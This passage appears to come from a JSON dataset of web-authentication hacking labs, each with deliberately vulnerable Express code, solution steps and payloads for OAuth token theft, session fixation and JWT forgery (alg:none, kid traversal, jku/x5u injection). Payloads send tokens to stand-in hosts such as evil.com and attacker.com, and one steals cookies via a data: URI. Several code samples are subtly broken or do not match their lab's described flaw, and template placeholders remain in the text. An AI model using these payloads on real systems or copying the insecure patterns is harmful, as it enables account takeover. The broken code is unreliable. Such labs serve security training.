        "srcCode": "const express = require('express'); const request = require('request'); const app = express(); app.get('/auth', (req, res) => { const { redirect_uri } = req.query; const url = `https://oauth.fake-provider.com/auth?client_id=app123&redirect_uri=${redirect_uri}&response_type=token`; res.redirect(url); }); app.get('/oauth-callback', (req, res) => { const token = req.query.access_token; request.get({ url: 'https://oauth.fake-provider.com/userinfo', headers: { Authorization: `Bearer ${token}` } }, (err, resp, body) => { const userInfo = JSON.parse(body); if (userInfo.email === 'carlos@example.com') { res.send('Account page for carlos'); } else { res.send('Unauthorized'); } }); }); const PORT = 3000; app.listen(PORT, () => console.log(`OAuth Redirect URI Lab running on http://localhost:${PORT}`));",
        "payloads": [
          "https://oauth.fake-provider.com/auth?client_id=app123&redirect_uri=https://evil.com/callback",
          "Manipulated redirect_uri=https://evil.com/callback",
          "Stolen token from OAuth callback"
        ]
      },
      {
        "Lab scenario": "Session fixation via predictable session ID in login response",
        "Lab Description": "The application assigns session IDs before login and fails to regenerate them upon successful authentication. An attacker can predetermine a session and then trick a user into authenticating with it. To solve: Set a fixed session ID for Carlos before he logs in, then hijack the session to access his account page.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1. Use Burp Suite to capture a login request and observe that the session cookie is issued before login.",
          "2. Generate a fixed session ID and set it using document.cookie via XSS or social engineering in the victim’s browser.",
          "3. Wait for the victim (Carlos) to log in with the fixed session.",
          "4. Reuse the known session ID in your own browser via the Cookie header.",
          "5. Access the /account endpoint to retrieve Carlos’s data."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = [{ username: 'carlos', password: '123456' }]; app.get('/login', (req, res) => { const sid = req.cookies.sid || Math.random().toString(36).substring(2); res.cookie('sid', sid); res.send('<form method=\"POST\" action=\"/login\"><input name=\"username\" /><input name=\"password\" /><input type=\"submit\" /></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const sid = req.cookies.sid; sessions[sid] = username; res.redirect('/account'); } else { res.send('Login failed'); } }); app.get('/account', (req, res) => { const username = sessions[req.cookies.sid]; if (username === 'carlos') res.send('Account data for carlos'); else res.send('Access denied'); }); const PORT = 3000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
        "payloads": [
          "Cookie: sid=abc123 (set in victim's browser)",
          "Session hijack via fixed sid=abc123",
          "Use of known SID to access /account as carlos"
        ]
      },
      {
        "Lab scenario": "JWT Secret Key Brute-Force in Authorization Header",
        "Lab Description": "This lab uses JWT tokens for stateless authentication but fails to use a secure secret key. The token is signed with a guessable value, making it vulnerable to brute-force attacks. The application verifies the signature using a hardcoded secret and grants access based on the 'admin' claim. To solve: Forge a valid JWT token with 'admin':true and access the /admin endpoint.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use Burp Suite to intercept the JWT token from the Authorization header after logging in as a regular user.",
          "Use jwt.io or jwt_tool to decode the token and analyze the header and payload.",
          "Brute-force the JWT secret using a common wordlist with jwt-cracker or hashcat (mode 16500).",
          "Once the correct secret is found, modify the payload to include 'admin':true and re-sign the token.",
          "Replace the original Authorization header with the forged token and send a GET request to /admin to verify access."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.json()); const SECRET = 'letmein'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username, admin: false }, SECRET); res.json({ token }); }); app.get('/admin', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; try { const decoded = jwt.verify(token, SECRET); if (decoded.admin) return res.send('Admin Access Granted'); return res.status(403).send('Forbidden'); } catch (err) { return res.status(400).send('Invalid token'); } }); app.listen(4000, () => console.log('JWT Lab running on port 4000'));",
        "payloads": [
          "jwt_tool original_token -C -p '{\"admin\":true}' -s letmein",
          "jwt.io using header/payload re-sign with secret 'letmein'",
          "Authorization: Bearer <new_token_with_admin_true>"
        ]
      },
      {
        "Lab scenario": "Session Fixation via Weak Token Binding",
        "Lab Description": "The application assigns a session cookie before login and fails to regenerate it after authentication. Attackers can set a known session ID and trick the victim into logging in with it. To solve: Fix a session ID, trick the victim to log in, then reuse the session ID to access /my-account as the victim.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use OWASP ZAP to observe that the session cookie is issued pre-authentication and not updated post-login.",
          "Set a fixed session ID using Burp's cookie editor and open the login page with this cookie.",
          "Host a malicious page that opens the login URL with the attacker's fixed session cookie (social engineering).",
          "After the victim logs in, reuse the same session ID in a new request to access the /my-account endpoint.",
          "Confirm access to victim's account without knowing their credentials."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const users = { 'alice': { password: '12345' } }; const sessions = {}; app.use((req, res, next) => { if (!req.cookies.sid) { const sid = Math.random().toString(36).substring(2); res.cookie('sid', sid); sessions[sid] = {}; } next(); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] && users[username].password === password) { const sid = req.cookies.sid; sessions[sid].user = username; res.send('Login successful'); } else { res.send('Login failed'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.sid; const user = sessions[sid]?.user; if (user) res.send(`Welcome back, ${user}`); else res.status(401).send('Please log in'); }); app.listen(4000, () => console.log('Session Fixation Lab running on port 4000'));",
        "payloads": [
          "Set-Cookie: sid=attacker123;",
          "GET /login (with sid=attacker123)",
          "Reuse sid=attacker123 after victim login"
        ]
      },
      {
        "Lab scenario": "OAuth Implicit Flow Token Theft via Referer Leak",
        "Lab Description": "This lab uses OAuth 2.0 implicit flow to obtain access tokens via redirects. The redirection target page leaks the access token in the Referer header. To solve: Intercept the redirect and steal the token using a malicious third-party page, then access /oauth/user-info as the victim.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Analyze the OAuth login flow with Burp Suite and confirm that the access token is returned in the URL fragment (#access_token=...).",
          "Observe that the final redirect goes to a page that loads external content, such as an image or script.",
          "Host a malicious image on your server and inject it into the redirect target page to capture Referer headers.",
          "Trigger the OAuth login and have the redirect go through your image endpoint, capturing the access token in the Referer.",
          "Use the stolen token in a Bearer Authorization header to access /oauth/user-info."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); app.get('/oauth/redirect', (req, res) => { res.send('<html><body><img src=\"http://attacker.com/log?ref='+req.headers.referer+'\" /></body></html>'); }); app.get('/oauth/user-info', (req, res) => { const auth = req.headers['authorization']; if (!auth || !auth.startsWith('Bearer ')) return res.status(401).send('Missing token'); const token = auth.split(' ')[1]; if (token === 'valid-oauth-token') res.send('User info: carlos'); else res.status(403).send('Invalid token'); }); app.listen(4000, () => console.log('OAuth Token Leak Lab running on port 4000'));",
        "payloads": [
          "OAuth login flow ending at /oauth/redirect",
          "Malicious image hosted at http://attacker.com/log",
          "GET /oauth/user-info with Authorization: Bearer valid-oauth-token"
        ]
      },
      {
        "Lab scenario": "JWT signature 'none' bypass in Authorization header",
        "Lab Description": "The application uses JWT tokens for authentication but does not validate the token's signature algorithm properly. It allows an attacker to manipulate the JWT by setting the `alg` header to 'none'. The application accepts unsigned tokens. To solve: forge a JWT with `alg: none` to access Carlos's account.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1. Intercept a valid login request using Burp Suite and observe the JWT in the Authorization header after successful login.",
          "2. Decode the JWT using jwt.io or Postman to examine the header, payload, and signature.",
          "3. Craft a new JWT with `alg: none`, set `sub: carlos`, and remove the signature.",
          "4. Replace the original JWT in the Authorization header with your forged token using Burp Repeater.",
          "5. Send a GET request to /my-account using the forged token and verify access to Carlos’s account."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const users = [{ username: 'carlos', role: 'user' }]; app.get('/my-account', (req, res) => { const authHeader = req.headers['authorization']; const token = authHeader && authHeader.split(' ')[1]; try { const payload = jwt.decode(token, { complete: true }); if (payload && payload.payload.sub) { res.send(`Account details for ${payload.payload.sub}`); } else { res.status(401).send('Unauthorized'); } } catch (e) { res.status(401).send('Invalid token'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT None Bypass Lab running on http://localhost:${PORT}`));",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJzdWIiOiJjYXJsb3MiLCJyb2xlIjoiYWRtaW4ifQ.",
          "{\"alg\":\"none\"}.{ \"sub\":\"carlos\" }.",
          "Authorization: Bearer <forged-token>"
        ]
      },
      {
        "Lab scenario": "Session fixation in pre-login cookie assignment",
        "Lab Description": "This application sets a session ID cookie before authentication. Upon login, it reuses the existing session instead of regenerating it, allowing session fixation attacks. To solve: fix a session, get Carlos to log in using it, then hijack the session.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Use OWASP ZAP or Burp Suite to access the login page and capture the `sessionId` cookie issued pre-login.",
          "2. Send Carlos a phishing email with a crafted link to the login page that forces use of the session ID you control.",
          "3. Once Carlos logs in, use the fixed session ID cookie to access /my-account as Carlos.",
          "4. Send the session cookie with a GET request to /my-account using Burp Repeater.",
          "5. Confirm unauthorized access to Carlos's account using the fixed session."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = { 'carlos': 'hunter2' }; app.get('/login', (req, res) => { if (!req.cookies.sessionId) { res.cookie('sessionId', Math.random().toString(36).substring(2)); } res.send('Login Page'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { sessions[req.cookies.sessionId] = username; res.redirect('/my-account'); } else { res.status(401).send('Login failed'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.sessionId]; if (user) res.send(`Welcome back, ${user}`); else res.status(403).send('Access denied'); }); app.listen(4000, () => console.log('Session Fixation Lab running on http://localhost:4000'));",
        "payloads": [
          "Cookie: sessionId=fixed123",
          "http://target-app.com/login?sessionId=fixed123",
          "Set-Cookie: sessionId=fixed123"
        ]
      },
      {
        "Lab scenario": "OAuth token leakage via redirect URI manipulation",
        "Lab Description": "The app implements OAuth login but does not properly validate redirect URIs during token exchange. An attacker can manipulate the redirect_uri parameter to capture tokens. To solve: leak Carlos’s token using a crafted malicious redirect_uri.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Use Burp Suite to initiate the OAuth flow and identify the request containing the `redirect_uri` parameter.",
          "2. Modify the `redirect_uri` to a domain you control (e.g., https://evil.com/callback) using Burp Repeater.",
          "3. Send the modified authorization request to the victim (Carlos) to trick them into authenticating.",
          "4. Capture the access_token from your controlled redirect endpoint.",
          "5. Use Postman to send a request with the captured token to /my-account and access Carlos’s data."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const querystring = require('querystring'); const app = express(); const tokens = { 'carlos': 'carlos-token-xyz' }; app.get('/oauth/authorize', (req, res) => { const { redirect_uri, state, user } = req.query; if (tokens[user]) { const uri = `${redirect_uri}?access_token=${tokens[user]}&state=${state}`; res.redirect(uri); } else { res.status(400).send('Invalid user'); } }); app.get('/my-account', (req, res) => { const token = req.query.access_token; const user = Object.keys(tokens).find(u => tokens[u] === token); if (user) res.send(`Hello ${user}, this is your account.`); else res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('OAuth Redirect URI Lab running on http://localhost:4000'));",
        "payloads": [
          "https://attacker.com/callback?access_token=carlos-token-xyz",
          "GET /oauth/authorize?redirect_uri=https://attacker.com/callback&user=carlos&state=123",
          "GET /my-account?access_token=carlos-token-xyz"
        ]
      },
      {
        "Lab scenario": "JWT alg:none bypass in REST API authentication",
        "Lab Description": "The lab's authentication system uses JWT tokens with improper signature validation. The application fails to verify the token signature when the alg field is set to 'none'. To solve: craft a valid JWT token with admin privileges without knowing the secret key.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Intercept a valid JWT token using Burp Suite while logging in as a normal user",
            "Decode the token using jwt.io to analyze its structure",
            "Modify the algorithm to 'none' and change the role to 'admin'",
            "Remove the signature portion of the JWT (after the last dot)",
            "Send the modified token in the Authorization header to access admin endpoints"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\n\napp.get('/admin', (req, res) => {\n  const token = req.headers.authorization.split(' ')[1];\n  const decoded = jwt.decode(token, { complete: true });\n  \n  if (decoded.header.alg === 'none') {\n    if (decoded.payload.role === 'admin') {\n      return res.send('Admin access granted');\n    }\n  } else {\n    try {\n      jwt.verify(token, 'secretkey');\n      if (decoded.payload.role === 'admin') {\n        return res.send('Admin access granted');\n      }\n    } catch (e) {\n      return res.status(403).send('Invalid token');\n    }\n  }\n  \n  res.status(403).send('Access denied');\n});\n\napp.listen(3000);",
        "payloads": [
            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiY2FybG9zIiwicm9sZSI6ImFkbWluIn0.",
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.",
            "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0."
        ]
    },
    {
        "Lab scenario": "GraphQL introspection query exposing authentication fields",
        "Lab Description": "The GraphQL endpoint has introspection enabled, revealing sensitive authentication fields and mutations. The application exposes password reset functionality through undocumented GraphQL mutations. To solve: exploit the exposed mutation to reset the admin password.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Use Postman to send introspection queries to the GraphQL endpoint",
            "Analyze the schema to discover hidden mutations using GraphQL Voyager",
            "Identify the passwordReset mutation and its required parameters",
            "Craft a mutation request with the admin email and new password",
            "Verify success by logging in with the new credentials"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const { ApolloServer, gql } = require('apollo-server-express');\nconst express = require('express');\n\nconst typeDefs = gql`\n  type Mutation {\n    passwordReset(email: String!, newPassword: String!): Boolean\n  }\n`;\n\nconst resolvers = {\n  Mutation: {\n    passwordReset: (_, { email, newPassword }) => {\n      const user = users.find(u => u.email === email);\n      if (user) {\n        user.password = newPassword;\n        return true;\n      }\n      return false;\n    }\n  }\n};\n\nconst server = new ApolloServer({ typeDefs, resolvers, introspection: true });\nconst app = express();\nserver.applyMiddleware({ app });\n\napp.listen({ port: 4000 }, () =>\n  console.log(`GraphQL lab running at http://localhost:4000${server.graphqlPath}`)\n);",
        "payloads": [
            "{\"query\":\"mutation { passwordReset(email: \\\"admin@lab.com\\\", newPassword: \\\"hacked123\\\") }\"}",
            "{\"query\":\"mutation {\\n  __schema {\\n    mutationType {\\n      fields {\\n        name\\n        description\\n      }\\n    }\\n  }\\n}\"}",
            "{\"query\":\"mutation($email: String!, $newPass: String!) { passwordReset(email: $email, newPassword: $newPass) }\",\"variables\":{\"email\":\"admin@lab.com\",\"newPass\":\"pwned!\"}}"
        ]
    },
    {
        "Lab scenario": "OAuth token hijacking through open redirect",
        "Lab Description": "The OAuth implementation has an open redirect vulnerability in the callback URL validation. The application fails to properly validate redirect URLs during OAuth token exchange. To solve: steal an OAuth token by tricking a user into authenticating through your malicious redirect.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Identify the OAuth callback endpoint using OWASP ZAP",
            "Craft a malicious URL with a controlled redirect parameter",
            "Set up a netcat listener to capture incoming tokens",
            "Social engineer a victim to click the crafted URL",
            "Intercept the token and use it to authenticate as the victim"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst app = express();\n\nconst clients = {\n  'client123': {\n    secret: 'secret123',\n    redirectUris: ['https://legit-client.com/callback']\n  }\n};\n\napp.get('/oauth/callback', (req, res) => {\n  const { code, state, redirect_uri } = req.query;\n  const clientId = req.query.client_id;\n  \n  if (!clients[clientId]) {\n    return res.status(400).send('Invalid client');\n  }\n  \n  if (code && redirect_uri) {\n    return res.redirect(`${redirect_uri}?code=${code}&state=${state}`);\n  }\n  \n  res.status(400).send('Invalid request');\n});\n\napp.listen(3000);",
        "payloads": [
            "https://vulnerable-oauth.com/oauth/callback?client_id=client123&redirect_uri=https://attacker.com&response_type=code&state=123",
            "https://vulnerable-oauth.com/oauth/callback?client_id=client123&redirect_uri=http://localhost:9000&response_type=token",
            "https://vulnerable-oauth.com/oauth/callback?client_id=client123&redirect_uri=data:text/html,<script>alert(document.cookie)</script>&response_type=code"
        ]
    },
    {
        "Lab scenario": "Session fixation in SOAP API authentication",
        "Lab Description": "The lab's SOAP-based authentication system is vulnerable to session fixation attacks. The application accepts pre-defined session IDs during login without proper validation. To solve: fixate a session ID and trick an admin into authenticating with it to gain privileged access.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Use OWASP ZAP to intercept a login request to /soap-auth endpoint",
            "Add a custom SessionID header with a predictable value (e.g., 'fixed123')",
            "Note the Set-Cookie response confirming session acceptance",
            "Craft a phishing link containing the fixed session ID",
            "Verify admin access by reusing the session ID after victim login"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst soap = require('soap');\nconst app = express();\n\nconst sessions = {};\n\napp.post('/soap-auth', (req, res) => {\n  const xml = req.rawBody;\n  const parser = new xml2js.Parser();\n  parser.parseString(xml, (err, result) => {\n    const sessionId = req.headers['sessionid'] || uuidv4();\n    sessions[sessionId] = {\n      user: result['soap:Envelope']['soap:Body'][0].Login[0].Username[0],\n      role: 'user'\n    };\n    res.set('Set-Cookie', `SESSION=${sessionId}; HttpOnly`);\n    res.send('<soap:Success/>');\n  });\n});\n\napp.listen(3000);",
        "payloads": [
            "<soap:Envelope><soap:Body><Login><Username>admin</Username><Password>any</Password></Login></soap:Body></soap:Envelope>",
            "POST /soap-auth HTTP/1.1\nHost: vulnerable.com\nSessionID: fixed123\nContent-Type: text/xml\n\n<soap:Envelope><soap:Body><Login><Username>victim</Username><Password>p@ssw0rd</Password></Login></soap:Body></soap:Envelope>",
            "GET /admin-panel HTTP/1.1\nHost: vulnerable.com\nCookie: SESSION=fixed123"
        ]
    },
    {
        "Lab scenario": "JWT kid header path traversal in REST microservice",
        "Lab Description": "The JWT validation service is vulnerable to key path traversal via the kid header parameter. The application uses the kid value to load verification keys without sanitization. To solve: craft a JWT that forces the server to use a predictable public key for verification.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Capture a valid JWT using Burp Suite and decode its structure",
            "Modify the kid header to point to /dev/null or /proc/self/fd/0",
            "Sign the token with an empty key using jwt_tool",
            "Brute-force the admin endpoint with the crafted token",
            "Verify access to privileged endpoints with the valid token"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst fs = require('fs');\nconst app = express();\n\napp.post('/verify-token', (req, res) => {\n  const token = req.body.token;\n  const decoded = jwt.decode(token, {complete: true});\n  \n  const keyPath = `/keys/${decoded.header.kid}`;\n  const pubKey = fs.readFileSync(keyPath);\n  \n  jwt.verify(token, pubKey, (err, payload) => {\n    if (err) return res.status(403).send('Invalid token');\n    res.json({access: payload.role === 'admin' ? 'granted' : 'denied'});\n  });\n});\n\napp.listen(3000);",
        "payloads": [
            "eyJhbGciOiJSUzI1NiIsImtpZCI6Ii4uLy4uLy4uLy4uLy4uLy4uL2Rldi9udWxsIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.FakeSignature",
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii9wcm9jL3NlbGYvZmQvMCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwiYWRtaW4iOnRydWV9.FakeSig",
            "eyJraWQiOiIva2V5cy8uLi8uLi9ldGMvcGFzc3dkIiwidHlwIjoiSldUIiwiYWxnIjoiSFMyNTYifQ.eyJ1c2VybmFtZSI6ImFkbWluIn0.FakeSignature"
        ]
    },
    {
        "Lab scenario": "OAuth token leakage through verbose error messages",
        "Lab Description": "The OAuth token endpoint leaks sensitive information through detailed error responses. The application reveals valid tokens in error messages when malformed requests are sent. To solve: extract a valid OAuth token by analyzing error responses and use it to access protected resources.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Use Postman to send malformed token requests to /oauth/token",
            "Analyze error responses for leaked token fragments",
            "Reconstruct complete tokens from error message snippets",
            "Validate tokens by accessing /api/me endpoint",
            "Exfiltrate user data using the stolen token"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst app = express();\n\nconst tokens = {\n  'abc123': {user: 'admin', scope: ['read','write']},\n  'def456': {user: 'guest', scope: ['read']}\n};\n\napp.post('/oauth/token', (req, res) => {\n  try {\n    const token = req.body.access_token;\n    if (!token) throw new Error('Missing token. Valid tokens: '+Object.keys(tokens).join(','));\n    if (!tokens[token]) throw new Error(`Invalid token. Similar valid tokens: ${Object.keys(tokens).filter(t => t.startsWith(token.substring(0,2))}`);\n    res.json(tokens[token]);\n  } catch (err) {\n    res.status(400).json({error: err.message});\n  }\n});\n\napp.listen(3000);",
        "payloads": [
            "access_token=a&grant_type=client_credentials",
            "{\"access_token\":\"ab\",\"token_type\":\"bearer\"}",
            "grant_type=password&username=admin&password=guess&scope=read write"
        ]
    },
    {
        "Lab scenario": "JWT role escalation via unsigned JWKS endpoint",
        "Lab Description": "The application's JSON Web Key Set (JWKS) endpoint returns unsigned public keys that can be manipulated to forge admin tokens. The application [fails to validate key signatures during JWT verification]. To solve: [craft a valid JWT with admin privileges by injecting a malicious key into the JWKS response].",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Intercept JWT flow using Burp Suite and identify jku header pointing to /jwks.json",
            "Modify JWKS response to include a crafted RSA public key using Postman",
            "Generate a new key pair and sign a token with the private key using jwt_tool",
            "Inject the modified jku header pointing to attacker-controlled endpoint",
            "Verify admin access by accessing /admin/dashboard with forged token"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\n\napp.get('/jwks.json', (req, res) => {\n  res.json({\n    keys: [{\n      kty: 'RSA',\n      e: 'AQAB',\n      kid: '1',\n      n: 'unsafe-key-modulus'\n    }]\n  });\n});\n\napp.post('/verify', (req, res) => {\n  const token = req.body.token;\n  const jku = jwt.decode(token, {complete: true}).header.jku;\n  \n  fetch(jku)\n    .then(r => r.json())\n    .then(keys => {\n      const key = keys.keys[0];\n      jwt.verify(token, key, {algorithms: ['RS256']}, (err, decoded) => {\n        res.json({access: decoded?.admin ? 'granted' : 'denied'});\n      });\n    });\n});\n\napp.listen(3000);",
        "payloads": [
            "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImprdSI6Imh0dHA6Ly9hdHRhY2tlci5jb20vandrcy5qc29uIn0.eyJ1c2VyIjoiYWRtaW4iLCJhZG1pbiI6dHJ1ZX0.FakeSig",
            "{\"keys\":[{\"kty\":\"RSA\",\"e\":\"AQAB\",\"kid\":\"hacked\",\"n\":\"attacker-modulus\"}]}",
            "eyJraWQiOiJoYWNrZWQiLCJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NSIsImFkbWluIjp0cnVlfQ.FakeSig"
        ]
    },
    {
        "Lab scenario": "OAuth token swapping through parameter pollution",
        "Lab Description": "The OAuth 2.0 implementation is vulnerable to access token substitution via duplicate parameter injection. The application [processes multiple token parameters inconsistently]. To solve: [steal an admin access token by injecting duplicate token parameters in the authorization flow].",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Capture OAuth flow using OWASP ZAP and note token exchange endpoint",
            "Intercept /oauth/callback request and add duplicate access_token parameter",
            "Chain the attack by first obtaining a low-privilege token from the provider",
            "Inject the stolen admin token as second parameter while preserving original",
            "Verify privilege escalation by accessing /api/admin with swapped token"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/oauth/callback', (req, res) => {\n  const tokens = req.query.access_token || [];\n  const token = Array.isArray(tokens) ? tokens.pop() : tokens;\n  \n  db.findUserByToken(token, (err, user) => {\n    if (user) {\n      req.session.user = user;\n      res.redirect('/dashboard');\n    } else {\n      res.status(403).send('Invalid token');\n    }\n  });\n});\n\napp.listen(3000);",
        "payloads": [
            "/oauth/callback?code=abc123&access_token=legitToken&access_token=stolenAdminToken",
            "GET /api/data?access_token=userToken&access_token=adminToken",
            "POST /token\nContent-Type: application/x-www-form-urlencoded\n\ngrant_type=authorization_code&code=SplxlO&access_token=admin123"
        ]
    },
    {
        "Lab scenario": "Session hijacking through GraphQL batch query abuse",
        "Lab Description": "The GraphQL endpoint processes batch operations with inconsistent session handling. The application [executes multiple mutations in a single request while maintaining session state]. To solve: [hijack an admin session by injecting session ID into batch mutation operation].",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Discover GraphQL endpoint using Burp Suite scanner",
            "Capture valid session cookie through normal login flow",
            "Craft batch mutation containing session hijack payload using GraphiQL",
            "Chain session ID swap mutation with privilege escalation query",
            "Verify session takeover by querying admin-only data fields"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst { graphqlHTTP } = require('express-graphql');\nconst app = express();\n\nconst schema = new GraphQLSchema({\n  mutation: new GraphQLObjectType({\n    name: 'RootMutationType',\n    fields: {\n      updateSession: {\n        type: SessionType,\n        args: { sessionId: { type: GraphQLString } },\n        resolve: (_, args, req) => {\n          req.session.id = args.sessionId;\n          return req.session;\n        }\n      }\n    }\n  })\n});\n\napp.use('/graphql', graphqlHTTP({\n  schema: schema,\n  context: { session: { id: null } }\n}));\n\napp.listen(3000);",
        "payloads": [
            "[{\"query\":\"mutation {updateSession(sessionId: \\\"adminSession\\\"){id}}\"},{\"query\":\"query {secretData {classified}}\"}]",
            "{\"query\":\"mutation($sid: String!) {a: updateSession(sessionId: $sid) {id} b: __typename}\",\"variables\":{\"sid\":\"stolenSession123\"}}",
            "POST /graphql\nContent-Type: application/json\n\n[{\"query\":\"mutation {login(username: \\\"user\\\", password: \\\"pass\\\") {sessionId}}\"},{\"query\":\"mutation {updateSession(sessionId: \\\"admin\\\") {id}}\"}]"
        ]
    },
    {
        "Lab scenario": "JWT public key injection via x5u header",
        "Lab Description": "The JWT validation service trusts arbitrary x5u header URLs to fetch verification certificates. The application [fails to validate certificate chain authenticity when processing x5u headers]. To solve: [forge a valid admin token by injecting a malicious x5u URL pointing to attacker-controlled X.509 certificate].",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Intercept valid JWT using Burp Suite and observe x5u header usage",
            "Generate self-signed X.509 certificate with admin privileges using OpenSSL",
            "Host malicious certificate on attacker-controlled server",
            "Craft JWT with x5u pointing to malicious certificate and sign with private key",
            "Verify admin access by submitting token to /admin-api endpoint"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst https = require('https');\nconst app = express();\n\napp.post('/verify-token', (req, res) => {\n  const token = req.body.token;\n  const decoded = jwt.decode(token, {complete: true});\n  \n  https.get(decoded.header.x5u, (certRes) => {\n    let certData = '';\n    certRes.on('data', (chunk) => certData += chunk);\n    certRes.on('end', () => {\n      jwt.verify(token, certData, (err, payload) => {\n        res.json({admin: payload?.admin || false});\n      });\n    });\n  });\n});\n\napp.listen(3000);",
        "payloads": [
            "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsIng1dSI6Imh0dHBzOi8vYXR0YWNrZXIuY29tL21hbGljaW91cy5jZXIifQ.eyJ1c2VyIjoiYWRtaW4iLCJhZG1pbiI6dHJ1ZX0.FakeSig",
            "{\"token\":\"eyJhbGciOiJSUzI1NiIsIng1dSI6Imh0dHA6Ly9sb2NhbGhvc3Q6OTAwMC9ldmlsLmNlciJ9.eyJzdWIiOiIxMjM0NSIsImFkbWluIjp0cnVlfQ.FakeSig\"}",
            "POST /verify-token\nContent-Type: application/json\n\n{\"token\":\"eyJhbGciOiJSUzI1NiIsIng1dSI6Imh0dHBzOi8vZXZpbC5leGUvY2VydC5wZW0ifQ.eyJ1c2VybmFtZSI6ImFkbWluIn0.FakeSig\"}"
        ]
    },
    {
        "Lab scenario": "OAuth token replay through state parameter injection",
        "Lab Description": "The OAuth implementation fails to validate state parameter binding during token redemption. The application [accepts previously used authorization codes when accompanied by a new state parameter]. To solve: [intercept an authorization code and replay it with a forged state parameter to obtain fresh access tokens].",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Intercept OAuth flow using OWASP ZAP and capture /callback request",
            "Note authorization code and original state parameter values",
            "Replay authorization code to /token endpoint with new state parameter",
            "Chain the attack by maintaining multiple valid state values",
            "Verify token validity by accessing user profile with stolen token"
        ],
        "Vulnerability name": "Authentication",
